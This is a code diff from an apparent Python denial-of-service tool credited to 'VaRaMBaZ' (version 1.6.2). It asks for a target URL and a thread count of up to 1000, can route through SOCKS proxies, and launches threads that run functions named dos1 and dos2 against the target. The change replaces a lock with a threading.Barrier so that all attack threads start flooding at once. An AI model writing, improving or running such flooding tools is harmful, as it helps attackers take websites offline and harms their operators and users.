@@ -40,19 +40,14 @@ with open('proxysocks') as file:
     proxy_socks = ''.join(file.readlines()).strip().split('\n')
 os.remove("proxysocks")
 # Запуск потоков
-locker = threading.Lock()
 
-def dospause1():
-    locker.acquire()
-    if i == threads:
-        locker.release()
-        dos1(url)
+def dospause1(barrier, url):
+    barrier.wait()
+    dos1(url)
 
-def dospause2():
-    locker.acquire()
-    if i == threads:
-        locker.release()
-        dos1(url)
+def dospause2(barrier, url):
+    barrier.wait()
+    dos2(url)
 
 # Аттака
 def dos1(target):
@@ -104,7 +99,7 @@ print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/
 print("Creator: VaRaMBaZ")
 print("Version: 1.6.2; Improving the menu and optimizing the attack \n")
 
-
+sum = 0
 url = input("URL: ")
 if not url.__contains__("http"):
     exit(colorama.Fore.RED + "URL doesnt contains http or https!")
@@ -120,16 +115,19 @@ except ValueError:
 if threads == 0 or threads > 1000:
     exit(colorama.Fore.RED + "Threads count is incorrect!")
 
+bar = threading.Barrier(threads)
 proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 print("")
 
 print(colorama.Fore.YELLOW + "Starting threads...")
 if (proxyuseage == 1):
     for i in range(0, threads):
-        thr = threading.Thread(target=dospause1)
+        sum = sum + 1
+        thr = threading.Thread(target=dospause1, args=(bar, url, ))
         thr.start()
 else:
     for i in range(0, threads):
-        thr2 = threading.Thread(target=dospause2)
+        sum = sum + 1
+        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running!")
